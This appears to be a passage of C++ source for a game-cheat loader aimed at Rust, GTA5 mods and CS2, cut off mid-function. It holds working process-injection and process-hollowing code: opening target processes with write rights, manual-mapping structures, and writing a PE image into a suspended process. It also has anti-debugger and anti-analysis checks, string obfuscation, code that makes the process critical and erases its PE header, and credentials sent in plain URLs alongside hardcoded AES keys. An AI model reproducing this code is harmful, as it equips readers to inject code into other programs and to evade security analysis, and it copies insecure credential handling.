	lpdwProcessIds = (LPDWORD)HeapAlloc(GetProcessHeap(), 0, MAX_PROCESSES * sizeof(DWORD));
	if (lpdwProcessIds != NULL)
	{
		if (EnumProcesses(lpdwProcessIds, MAX_PROCESSES * sizeof(DWORD), &cdwProcesses))
		{
			lpszBaseName = (LPTSTR)HeapAlloc(GetProcessHeap(), 0, MAX_PATH * sizeof(TCHAR));
			if (lpszBaseName != NULL)
			{
				cdwProcesses /= sizeof(DWORD);
				for (i = 0; i < cdwProcesses; i++)
				{
					hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lpdwProcessIds[i]);
					if (hProcess != NULL)
					{
						if (GetModuleBaseName(hProcess, NULL, lpszBaseName, MAX_PATH) > 0)
						{
							if (!lstrcmpi(lpszBaseName, lpcszFileName))
							{
								dwProcessId = lpdwProcessIds[i];
								CloseHandle(hProcess);
								break;
							}
						}
						CloseHandle(hProcess);
					}
				}
				HeapFree(GetProcessHeap(), 0, (LPVOID)lpszBaseName);
			}
		}
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpdwProcessIds);
	}
	return dwProcessId;
}
DWORD MyGetProcessId(LPCTSTR ProcessName)
{
	PROCESSENTRY32 pt;
	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pt.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hsnap, &pt)) {
		do {
			if (!lstrcmpi(pt.szExeFile, ProcessName)) {
				CloseHandle(hsnap);
				return pt.th32ProcessID;
			}
		} while (Process32Next(hsnap, &pt));
	}
	CloseHandle(hsnap);
	return 0;
}

PIMAGE_DOS_HEADER pIDH;
PIMAGE_NT_HEADERS pINH;
PIMAGE_SECTION_HEADER pISH;
HANDLE hProcess, hThread, hToken;
PVOID buffer, imageq, mem;
DWORD i, FileSize, ProcessId, ExitCode, readqw;
TOKEN_PRIVILEGES tp;
MANUAL_INJECT ManualInject;
HMODULE GetRemoteModuleHandleA(DWORD dwProcessId, const char* szModule)
{
	HANDLE tlh = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);

	MODULEENTRY32 modEntry;

	modEntry.dwSize = sizeof(MODULEENTRY32);

	Module32First(tlh, &modEntry);
	do
	{
		if (_stricmp(szModule, modEntry.szModule) == 0)
		{
			CloseHandle(tlh);

			return modEntry.hModule;
		}
	} while (Module32Next(tlh, &modEntry));

	CloseHandle(tlh);

	return NULL;
}
bool autbypass = false;

//#include "webclient.hpp"
struct MemoryStruct {
	char* memory;
	size_t size;
};

static size_t
WriteMemoryCallback(void* contents, size_t size, size_t nmemb, void* userp) {
	size_t realsize = size * nmemb;
	struct MemoryStruct* mem = (struct MemoryStruct*)userp;
	char* ptr = (char*)realloc(mem->memory, mem->size + realsize + 1);
	mem->memory = ptr;
	memcpy(&(mem->memory[mem->size]), contents, realsize);
	mem->size += realsize;
	mem->memory[mem->size] = 0;

	return realsize;
}
//#include "../httrequster.hpp"

int GetPIDByName(const char* ProcName) {
	PROCESSENTRY32 PE32{ 0 };
	PE32.dwSize = sizeof(PE32);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		printf("[-] CreateToolhelp32Snapshot error: 0x%X\n", GetLastError());
		system("pause");
		return 0;
	}

	DWORD PID = 0;
	BOOL bRet = Process32First(hSnap, &PE32);
	while (bRet) {
		if (!strcmp(ProcName, _bstr_t(PE32.szExeFile))) {
			PID = PE32.th32ProcessID;
			break;
		}

		bRet = Process32Next(hSnap, &PE32);
	}

	CloseHandle(hSnap);

	return PID;
}

HANDLE OpenProc(const char* ProcName) {
	int PID = GetPIDByName(ProcName);
	if (PID == 0) {
		printf("[-] Can't get %s PID\n", ProcName);
		system("pause");
		return nullptr;
	}

	printf("[+] %s PID: %d\n", ProcName, PID);

	HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
	if (!hProc) {
		printf("[-] OpenProcess error: 0x%X\n", GetLastError());
		system("pause");
		return nullptr;
	}

	return hProc;
}
int getProcID(const std::string& p_name)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 structprocsnapshot = { 0 };

	structprocsnapshot.dwSize = sizeof(PROCESSENTRY32);

	if (snapshot == INVALID_HANDLE_VALUE)return 0;
	if (Process32First(snapshot, &structprocsnapshot) == FALSE)return 0;

	while (Process32Next(snapshot, &structprocsnapshot))
	{
		if (!lstrcmp(structprocsnapshot.szExeFile, p_name.c_str()))
		{
			CloseHandle(snapshot);
			return structprocsnapshot.th32ProcessID;
		}
	}
	CloseHandle(snapshot);
	return 0;

}
typedef HMODULE(__stdcall* pLoadLibraryA)(LPCSTR);
typedef FARPROC(__stdcall* pGetProcAddress)(HMODULE, LPCSTR);

typedef INT(__stdcall* dllmain)(HMODULE, DWORD, LPVOID);


struct loaderdata
{
	LPVOID ImageBase;

	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION BaseReloc;
	PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;

	pLoadLibraryA fnLoadLibraryA;
	pGetProcAddress fnGetProcAddress;

};
DWORD __stdcall LibraryLoader(LPVOID Memory);
using f_LoadLibraryA = HINSTANCE(WINAPI*)(const char* lpLibFilename);
using f_GetProcAddress = FARPROC(WINAPI*)(HMODULE hModule, LPCSTR lpProcName);
using f_DLL_ENTRY_POINT = BOOL(WINAPI*)(void* hDll, DWORD dwReason, void* pReserved);
using f_RtlAddFunctionTable = BOOL(WINAPI*)(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, DWORD64 BaseAddress);

struct MANUAL_MAPPING_DATA {
	f_LoadLibraryA pLoadLibraryA;
	f_GetProcAddress pGetProcAddress;
	f_RtlAddFunctionTable pRtlAddFunctionTable;
	BYTE* pbase;
	HINSTANCE hMod;
	DWORD fdwReasonParam;
	LPVOID reservedParam;
	BOOL SEHSupport;
};
DWORD __stdcall stub()
{
	return 0;
}
typedef DWORD(WINAPI* pRtlCreatUserThread)(

	IN		HANDLE					ProcessHandle,
	IN 		PSECURITY_DESCRIPTOR	SecurityDescriptor,
	IN		BOOLEAN					CreateSuspended,
	IN		ULONG					StackZeroBits,
	IN OUT	PULONG					StackReserved,
	IN OUT	PULONG					StackCommit,
	IN		PVOID					StartAddress,
	IN		PVOID					StartParameter,
	OUT		PHANDLE					ThreadHandle,
	OUT		PVOID					ClientID

	);


void __stdcall Shellcode(MANUAL_MAPPING_DATA* pData);



namespace switch_Adress_func
{

	class thread_queue_mgr
	{
	public:

		template <typename Func, typename... Args>
		inline static void native_emplace(const Func& task_func, Args &&...args) {
			funcs_to_invoke.emplace_back(
				std::make_pair(std::async(std::launch::deferred, task_func, args...),
					GetTickCount64()));
		}

		void on_new_tick() {
			auto current_tick = GetTickCount64();
			for (auto& funcs : funcs_to_invoke) {
				if (current_tick - funcs.second < 1000) {
					funcs.first.get();
				}
			}

			funcs_to_invoke.clear();
		}
	private:
		inline static std::vector<std::pair<std::future<void>, uintptr_t>> funcs_to_invoke;
	};

	inline thread_queue_mgr* _queue{};
}

int RunExeFromMemory(void* pe) {

	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS64* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	ZeroMemory(&PI, sizeof(PI));
	ZeroMemory(&SI, sizeof(SI));


	void* pImageBase;

	char currentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(pe);
	NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {

		GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
		//create process
		if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {

			CONTEXT* CTX;
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;


			UINT64 imageBase = 0;
			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
				pImageBase = VirtualAllocEx(
					PI.hProcess,
					LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage,
					MEM_COMMIT | MEM_RESERVE,
					PAGE_EXECUTE_READWRITE

				);


				WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
				//write pe sections
				for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));

					WriteProcessMemory(
						PI.hProcess,
						LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
						SectionHeader->SizeOfRawData,
						NULL
					);
					WriteProcessMemory(
						PI.hProcess,
						LPVOID(CTX->Rdx + 0x10),
						LPVOID(&NtHeader->OptionalHeader.ImageBase),
						8,
						NULL
					);

				}

				CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
				ResumeThread(PI.hThread);

				WaitForSingleObject(PI.hProcess, NULL);

				return 0;

			}
		}
	}
}





namespace uLoader
{
	int banuseractivate() {
		std::string output = ban_acc_from_forum();
		if (output == xorstr_("banned")) {
			return 1;
		}
	}
	bool check_version()
	{
		std::string server_version = CheckVersion();
		if (server_version == Globals::client_side.version) {
			return true;
		}
		else {
			return false;
		}
	}
	int globalbanshwid(string nadolibanit) { //"0" бан не выдается, "1" бан выдается
		std::string nadolibanitt = nadolibanit;
		std::string output = GlobalBanHwid(nadolibanitt);
		if (output == xorstr_("estbanhwida")) {
			return 1;
		}
		else if (output == xorstr_("bananet")) {
			return 2;
		}
	}
	bool check_one_log = false;
	int checkloginmb() {
		std::string output;
		if (!check_one_log) {
			output = Login();
			check_one_log = true;
		}
		if (output == xorstr_("username:fail")) {
			return 4;
		}
		else if (output == xorstr_("PASSWORD:fail")) {
			return 5;
		}
		else if (output == xorstr_("hwid:fail")) {
			return 2;
		}
		else if (output == xorstr_("ban:fail")) {
			return 6;
		}
		else if (output == xorstr_("success role")) {
			return 1;
		}
		else if (output == xorstr_("role:fail")) {
			return 3;
		}
	}
	
	vector<std::string> получениеподписки() {
		std::string tempory_cipher_key;
		std::string tempory_iv_key;
		std::vector<std::string> vector_tempory_key;
		auto unprotect_request = DownloadString((string)xorstr_("https://") + Global::server.server + (string)xorstr_("/client/session.php"));
		for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
			tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
		for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
			tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
		std::string protect_request = aes::encrypt(unprotect_request, tempory_cipher_key, tempory_iv_key);
		std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
		std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
		unprotect_request = aes::encrypt(unprotect_request, (string)xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), (string)xorstr_("H1ggF9foFGLerr8q")); // static keys


		vector<string> vec_subs;

		std::string accepted_request; 
		std::string getted_request;
		std::string getttttt;

		const char* nametab_array1[9] = { "1", "11", "12", "13", "16", "17", "18", "19", "20" };

		for (int i = 0; i < sizeof(nametab_array1) / sizeof(nametab_array1[0]); i++) {

			accepted_request = DownloadString((string)xorstr_("https://amph.su/client/get_sub.php?a=") + unprotect_request + (string)xorstr_("&b=") + protect_request + (string)xorstr_("&username=") + protect_username + (string)xorstr_("&password=") + protect_password + "&check_user_upgrade=" + nametab_array1[i]); //gta5 altv 1day
			getted_request = aes::decrypt(aes::decrypt(accepted_request, tempory_cipher_key, tempory_iv_key), tempory_cipher_key, tempory_iv_key);
			
			if (getted_request != "delete") {
				if (nametab_array1[i] == nametab_array1[0]) { //alkad
					getttttt = getted_request + " Rust Alkad";
				}
				if (nametab_array1[i] == nametab_array1[1] || nametab_array1[i] == nametab_array1[2] || nametab_array1[i] == nametab_array1[3]) { //ragemp
					getttttt = getted_request + " GTA5 RageMP";
				}
				if (nametab_array1[i] == nametab_array1[4]) { //cs2
					getttttt = getted_request + " CS-2";
				}
				if (nametab_array1[i] == nametab_array1[5] || nametab_array1[i] == nametab_array1[6] || nametab_array1[i] == nametab_array1[7] || nametab_array1[i] == nametab_array1[8]) { //altv
					getttttt =  getted_request + " GTA5 Alt:V";
				}

				std::cout << getttttt << endl;
				vec_subs.push_back(getttttt);
			}
		}
	
		

		return vec_subs;
	}

	std::string requestchat;
	std::string chatmessage()
	{
		char request[9999];
		std::string passwordtwst = Global::client.password;
		std::string username = g_XenForo.Endpoint.Auth.Vars.User.username;
		CURL* curl;
		CURLcode res;
		std::string readBuffer;
		curl = curl_easy_init();
		if (curl) {
			li(sprintf)(request, xorstr_("https://amph.su/xenforochatcheat.php?username=%s&password=%s"), username, passwordtwst);
			curl_easy_setopt(curl, CURLOPT_URL, request);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
			res = curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			return readBuffer;
		}



		//std::string passwordtwst = Global::client.password;
		//std::string username = g_XenForo.Endpoint.Auth.Vars.User.username;
		//auto accepted_request = DownloadString((string)xorstr_("https://Ret9.cc/xenforochatcheat.php?username=") + username + (string)xorstr_("&password=") + passwordtwst);
		//return accepted_request;
	}
	void chatmessageSENT()
	{
		std::string passwordtwst = Global::client.password;
		std::string alogarash = xorstr_("1");
		char request[999999];
		std::string username = g_XenForo.Endpoint.Auth.Vars.User.username;
		CURL* curl;
		CURLcode res;
		std::string readBuffer;
		std::string realtimemessage = sec::getCurrentDateTime();
		curl = curl_easy_init();
		if (curl) {

			for (int i = 0; messagechat[i]; i++)
			{
				if (messagechat[i] == ' ')
				{
					messagechat[i] = '_';
				}
			}

			li(sprintf)(request, xorstr_("https://amph.su/xenforochatcheat.php?username=%s&password=%s&message=%s&alogarash=%s"), username.c_str(), passwordtwst, messagechat, alogarash.c_str());
			curl_easy_setopt(curl, CURLOPT_URL, request);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
			res = curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			cout << readBuffer;
		}
	}

}
__forceinline bool HideThread(HANDLE hThread)
{
	typedef NTSTATUS(NTAPI* pNtSetInformationThread)
		(HANDLE, UINT, PVOID, ULONG);

	NTSTATUS Status;

	// Get NtSetInformationThread
	pNtSetInformationThread NtSIT = (pNtSetInformationThread)
		GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtSetInformationThread");
	// Shouldn't fail
	if (NtSIT == NULL)
		return false;

	// Set the thread info
	if (hThread == NULL)
		Status = NtSIT(GetCurrentThread(),
			0x11, //ThreadHideFromDebugger
			0, 0);
	else
		Status = NtSIT(hThread, 0x11, 0, 0);

	if (Status != 0x00000000)
		return false;
	else
		return true;
}


//#include <Shlwapi.h>

#pragma once

#include "winapifamily.h"
#include <Windows.h>
#ifdef _MSC_VER
#pragma once
#endif  // _MSC_VER

#pragma region Application Family
#if WINAPI_FAMILY_PARTITION(WINAPI_PARTITION_DESKTOP)

#include <specstrings.h>    // for _In_, etc.


#if !defined(__midl) && !defined(SORTPP_PASS)

#if (NTDDI_VERSION >= NTDDI_WINXP)

#ifdef __cplusplus

#define VERSIONHELPERAPI inline bool

#else  // __cplusplus

#define VERSIONHELPERAPI FORCEINLINE BOOL

#endif // __cplusplus


VERSIONHELPERAPI
IsWindowsVersionOrGreater(WORD wMajorVersion, WORD wMinorVersion, WORD wServicePackMajor)
{
	OSVERSIONINFOEXW osvi = { sizeof(osvi), 0, 0, 0, 0, {0}, 0, 0 };
	DWORDLONG        const dwlConditionMask = VerSetConditionMask(
		VerSetConditionMask(
			VerSetConditionMask(
				0, VER_MAJORVERSION, VER_GREATER_EQUAL),
			VER_MINORVERSION, VER_GREATER_EQUAL),
		VER_SERVICEPACKMAJOR, VER_GREATER_EQUAL);

	osvi.dwMajorVersion = wMajorVersion;
	osvi.dwMinorVersion = wMinorVersion;
	osvi.wServicePackMajor = wServicePackMajor;

	return VerifyVersionInfoW(&osvi, VER_MAJORVERSION | VER_MINORVERSION | VER_SERVICEPACKMAJOR, dwlConditionMask) != FALSE;
}
VERSIONHELPERAPI
IsWindowsVistaOrGreater()
{
	return IsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_VISTA), LOBYTE(_WIN32_WINNT_VISTA), 0);
}
VERSIONHELPERAPI
IsWindowsVersionOrLesser(WORD wMajorVersion, WORD wMinorVersion, WORD wServicePackMajor)
{
	OSVERSIONINFOEXW osvi = { sizeof(osvi), 0, 0, 0, 0, { 0 }, 0, 0 };
	DWORDLONG        const dwlConditionMask = VerSetConditionMask(
		VerSetConditionMask(
			0, VER_MAJORVERSION, VER_EQUAL),
		VER_MINORVERSION, VER_LESS_EQUAL);

	osvi.dwMajorVersion = wMajorVersion;
	osvi.dwMinorVersion = wMinorVersion;
	osvi.wServicePackMajor = wServicePackMajor;

	return VerifyVersionInfoW(&osvi, VER_MAJORVERSION | VER_MINORVERSION, dwlConditionMask) != FALSE;
}
VERSIONHELPERAPI
IsWindowsXPOr2k()
{
	return IsWindowsVersionOrLesser(HIBYTE(_WIN32_WINNT_WINXP), LOBYTE(_WIN32_WINNT_WINXP), 0);
}

VERSIONHELPERAPI
IsWindowsXPOrGreater()
{
	return IsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_WINXP), LOBYTE(_WIN32_WINNT_WINXP), 0);
}

#endif // NTDDI_VERSION

#endif // defined(__midl)

#endif /* WINAPI_FAMILY_PARTITION(WINAPI_PARTITION_DESKTOP) */
#pragma endregion



#include <Psapi.h>
#include <sphelper.h>
#pragma comment(lib, "Psapi.lib")
DWORD GetProcIDFromName(LPCTSTR szProcessName)
{
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot = NULL;
	SecureZeroMemory(&pe32, sizeof(PROCESSENTRY32));

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &pe32) == FALSE)
	{
		CloseHandle(hSnapshot);
		return 0;
	}

	if (StrCmpI(pe32.szExeFile, szProcessName) == 0)
	{
		CloseHandle(hSnapshot);
		return pe32.th32ProcessID;
	}

	while (Process32Next(hSnapshot, &pe32))
	{
		if (StrCmpI(pe32.szExeFile, szProcessName) == 0)
		{
			CloseHandle(hSnapshot);
			return pe32.th32ProcessID;
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}
#include "../amthloader/superiorprotection/BeingDebugged.hpp"
#include "../amthloader/superiorprotection/CheckRemoteDebuggerPresent.hpp"
#include "../amthloader/superiorprotection/NtGlobalFlag.hpp"
#include "../amthloader/superiorprotection/HeapFlags.hpp"
#include "../amthloader/superiorprotection/ForceFlags.hpp"
#include "../amthloader/superiorprotection/NtQueryInfo_ProcessDebugPort.hpp"
#include "../amthloader/superiorprotection/NtQueryInfo_ProcessDebugFlags.h"
#include "../amthloader/superiorprotection/NtQueryInfo_ProcessDebugObject.hpp"
#include "../amthloader/superiorprotection/NtSetInfoThread_HideFromDebugger.hpp"
#include "../amthloader/superiorprotection/CloseHandle_InvalidHandle.hpp"
#include "../amthloader/superiorprotection/UnhandledExceptionFilter.hpp"
#include "../amthloader/superiorprotection/OutputDebugString.hpp"
#include "../amthloader/superiorprotection/HardwareBreakpoints.hpp"
#include "../amthloader/superiorprotection/SoftwareBreakpoints.hpp"
#include "../amthloader/superiorprotection/Interrupt_3.hpp"
#include "../amthloader/superiorprotection/MemoryBreakpoints_PageGuard.hpp"
#include "../amthloader/superiorprotection/ParentProcess.hpp"
#include "../amthloader/superiorprotection/SeDebugPrivilege.hpp"
#include "../amthloader/superiorprotection/NtQueryObj_ObjTypeInfo.hpp"
#include "../amthloader/superiorprotection/SetHandleInfo_API.hpp"



bool IsDebugging()
{
	if (IsDebuggerPresent() || /*IsDebuggerPresentPEB() ||*/ CheckRemoteDebuggerPresentAPI() || /*NtGlobalFlag() ||*/ /*HeapFlags() ||*//* HeapForceFlags()
		||*/ NtQueryInformationProcess_ProcessDebugPort() || NtQueryInformationProcess_ProcessDebugFlags() || NtQueryInformationProcess_ProcessDebugObject()
		|| NtSetInformationThread_ThreadHideFromDebugger() || CloseHandle_InvalideHandle() || UnhandledExcepFilterTest() || OutputDebugStringAPI()
		|| HardwareBreakpoints() /*|| SoftwareBreakpoints()*/ || Interrupt_3() || MemoryBreakpoints_PageGuard()/* || CanOpenCsrss()*/
		|| NtQueryObject_ObjectTypeInformation() || SetHandleInformatiom_ProtectedHandle())
	{
		return true;
	}
	return false;
}

bool IsAnalysing()
{
	auto m_fnIsRemoteSession = []() -> bool
		{
			const int m_iSessionMetrics = GetSystemMetrics(SM_REMOTESESSION);
			return m_iSessionMetrics != 0;
		};
	std::string m_szProcesses[] =
	{
		_xor_(_T("ollydbg.exe")),			// OllyDebug debugger
		_xor_(_T("ProcessHacker.exe")),		// Process Hacker
		_xor_(_T("tcpview.exe")),			// Part of Sysinternals Suite
		_xor_(_T("autoruns.exe")),			// Part of Sysinternals Suite
		_xor_(_T("autorunsc.exe")),			// Part of Sysinternals Suite
		_xor_(_T("filemon.exe")),			// Part of Sysinternals Suite
		_xor_(_T("procmon.exe")),			// Part of Sysinternals Suite
		_xor_(_T("regmon.exe")),			// Part of Sysinternals Suite
		_xor_(_T("procexp.exe")),			// Part of Sysinternals Suite
		_xor_(_T("idaq.exe")),				// IDA Pro Interactive Disassembler
		_xor_(_T("ida.exe")),				// IDA Pro Interactive Dissasembler
		_xor_(_T("idaq64.exe")),			// IDA Pro Interactive Disassembler
		_xor_(_T("ImmunityDebugger.exe")),	// ImmunityDebugger
		_xor_(_T("Wireshark.exe")),			// Wireshark packet sniffer
		_xor_(_T("dumpcap.exe")),			// Network traffic dump tool
		_xor_(_T("HookExplorer.exe")),		// Find various types of runtime hooks
		_xor_(_T("ImportREC.exe")),			// Import Reconstructor
		_xor_(_T("PETools.exe")),			// PE Tool
		_xor_(_T("LordPE.exe")),			// LordPE
		_xor_(_T("dumpcap.exe")),			// Network traffic dump tool
		_xor_(_T("SysInspector.exe")),		// ESET SysInspector
		_xor_(_T("proc_analyzer.exe")),		// Part of SysAnalyzer iDefense
		_xor_(_T("sysAnalyzer.exe")),		// Part of SysAnalyzer iDefense
		_xor_(_T("sniff_hit.exe")),			// Part of SysAnalyzer iDefense
		_xor_(_T("windbg.exe")),			// Microsoft WinDbg
		_xor_(_T("joeboxcontrol.exe")),		// Part of Joe Sandbox
		_xor_(_T("joeboxserver.exe")),		// Part of Joe Sandbox
		_xor_(_T("x32dbg.exe")),			// x32dbg
		_xor_(_T("x64dbg.exe")),			// x64dbg
		_xor_(_T("x96dbg.exe"))				// x64dbg part
	};
	WORD m_iLength = sizeof(m_szProcesses) / sizeof(m_szProcesses[0]);
	for (int i = 0; i < m_iLength; i++)
	{
		if (GetProcIDFromName(m_szProcesses[i].c_str()))
			return true;
	}
	return (m_fnIsRemoteSession());
}
VOID ErasePEHeaderFromMemory()
{
	DWORD OldProtect = 0;

	char* pBaseAddr = (char*)GetModuleHandle(NULL);

	VirtualProtect(pBaseAddr, 4096, PAGE_READWRITE, &OldProtect);

	SecureZeroMemory(pBaseAddr, 4096);
}


namespace sec
{
	__forceinline std::string sec::getCurrentDateTime()
	{
		time_t now = time(0);
		struct tm  tstruct;
		char  buf[80];
		tstruct = *localtime(&now);
		strftime(buf, sizeof(buf), "%Y-%m-%d - %H-%M-%S", &tstruct);
		return std::string(buf);
	};

	__forceinline void sec::Logger(std::string logMsg, int Mode)
	{
		std::ofstream log_file("Error_AMPH.log", std::ios_base::out | std::ios_base::app);
		switch (Mode)
		{
		case 0:
		{
			if (log_file.is_open())
			{
				log_file << "[ Date: " << sec::getCurrentDateTime() << " ] " << "[ success ] - " << logMsg << std::endl;
			}
			break;
		}
		case 1:
		{
			if (log_file.is_open())
			{
				log_file << "[ Date: " << sec::getCurrentDateTime() << " ] " << "[ error ] - " << logMsg << std::endl;
			}
			break;
		}
		case 2:
		{
			if (log_file.is_open())
			{
				log_file << "[ Date: " << sec::getCurrentDateTime() << " ] " << "[ banned ] - " << logMsg << std::endl;
			}
			break;
		}
		log_file.close();
		}
	}
	__forceinline BOOL sec::IsRemoteSession(void)
	{
		return GetSystemMetrics(SM_REMOTESESSION);
	}

	__forceinline BOOL sec::EnablePriv(LPCSTR lpszPriv)
	{
		HANDLE hToken;
		LUID luid;
		TOKEN_PRIVILEGES tkprivs;
		ZeroMemory(&tkprivs, sizeof(tkprivs));

		if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
			return FALSE;

		if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
			CloseHandle(hToken); return FALSE;
		}

		tkprivs.PrivilegeCount = 1;
		tkprivs.Privileges[0].Luid = luid;
		tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
		CloseHandle(hToken);
		return bRet;
	}
	__forceinline void sec::shutdown()
	{
		raise(11);
	}

	__forceinline void sec::Session()
	{
		std::this_thread::sleep_for(std::chrono::seconds(240));
		Logger(xorstr_("Session clossed because expired."), 1);
		shutdown();
	}

	__forceinline BOOL sec::MakeCritical()
	{
		HANDLE hDLL;
		RtlSetProcessIsCritical fSetCritical;

		hDLL = LoadLibraryA(xorstr_("ntdll.dll"));
		if (hDLL != NULL)
		{
			EnablePriv(SE_DEBUG_NAME);
			(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, (xorstr_("RtlSetProcessIsCritical")));
			if (!fSetCritical) return 0;
			fSetCritical(1, 0, 0);
			return 1;
		}
		else
			return 0;
	}

	__forceinline void sec::killProcessByName(const char* filename)
	{
		HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
		PROCESSENTRY32 pEntry;
		pEntry.dwSize = sizeof(pEntry);
		BOOL hRes = Process32First(hSnapShot, &pEntry);
		while (hRes)
		{
			if (strcmp(pEntry.szExeFile, filename) == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
					(DWORD)pEntry.th32ProcessID);
				if (hProcess != NULL)
				{
					TerminateProcess(hProcess, 9);
					CloseHandle(hProcess);
				}
			}
			hRes = Process32Next(hSnapShot, &pEntry);
		}
		CloseHandle(hSnapShot);
	}

	__forceinline bool sec::IsDebuggersInstalledThread()
	{
		LPVOID drivers[2048];
		DWORD cbNeeded;
		int cDrivers, i;

		if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
		{
			TCHAR szDriver[2048];

			cDrivers = cbNeeded / sizeof(drivers[0]);

			for (i = 0; i < cDrivers; i++)
			{
				if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
				{
					std::string strDriver = szDriver;
					if (strDriver.find("kprocesshacker") != std::string::npos)
					{
						Logger(xorstr_("Delete Process Hacker, before launching loader. And restart your PC."), 1);
						//return true;
						sec::shutdown();
					}
					if (strDriver.find("HttpDebug") != std::string::npos)
					{
						Logger(xorstr_("Delete HTTP Debugger, before launching loader. And restart your PC."), 1);
						return true;
					}
					if (strDriver.find("npf") != std::string::npos)
					{
						Logger(xorstr_("Delete Wireshark, before launching loader. And restart your PC."), 1);
						return true;
					}
					if (strDriver.find("TitanHide") != std::string::npos)
					{
						Logger(xorstr_("Delete TitanHide, before launching loader. And restart your PC."), 1);
						return true;
					}
					if (strDriver.find("SharpOD_Drv") != std::string::npos)
					{
						Logger(xorstr_("Remove SharpOD, before launching loader. And restart your PC."), 1);
						return true;
					}
				}
			}
		}
		return false;
	}
	__forceinline bool sec::IsDebuggersInstalledStart()
	{
		LPVOID drivers[2048];
		DWORD cbNeeded;
		int cDrivers, i;

		if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
		{
			TCHAR szDriver[2048];

			cDrivers = cbNeeded / sizeof(drivers[0]);

			for (i = 0; i < cDrivers; i++)
			{
				if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
				{
					std::string strDriver = szDriver;
					if (strDriver.find("kprocesshacker") != std::string::npos)
					{
						Logger(xorstr_("Delete Process Hacker, before launching loader. And restart your PC."), 1);
						return true;
					}
					if (strDriver.find("HttpDebug") != std::string::npos)
					{
						Logger(xorstr_("Delete HTTP Debugger, before launching loader. And restart your PC."), 1);
						return true;
					}
					if (strDriver.find("npf") != std::string::npos)
					{
